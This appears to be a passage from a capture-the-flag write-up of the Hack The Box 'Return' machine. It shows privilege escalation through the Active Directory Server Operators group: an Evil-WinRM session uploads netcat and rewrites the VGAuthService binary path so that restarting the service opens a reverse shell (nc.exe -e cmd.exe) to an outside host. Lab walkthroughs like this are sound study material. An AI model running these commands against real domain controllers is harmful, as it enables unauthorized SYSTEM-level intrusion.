**Server Operators** is a built-in group in Active Directory that grants members specific administrative capabilities over domain controllers. Members can manage services, including starting and stopping most services, perform backup and restore operations, shut down and restart the server, and handle disk management tasks.

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload /home/garffff/htb/return/nc.exe
                                        
Info: Uploading /home/garffff/htb/return/nc.exe to C:\Users\svc-printer\Documents\nc.exe
                                        
Data: 37544 bytes of 37544 bytes copied
                                        
Info: Upload successful!
```

```bash
*Evil-WinRM* PS C:\Users\svc-printer\desktop> services

Path                                                                                                                 Privileges Service          
----                                                                                                                 ---------- -------          
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796    
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                                                False Sense            
C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller 
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService    
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools          
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"                                             True WdNisSvc         
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                            True WinDefend        
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                                      False WMPNetworkSvc
```

```bash
sc.exe config VGAuthService binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.4 443"
sc.exe stop VGAuthService
sc.exe start VGAuthService
```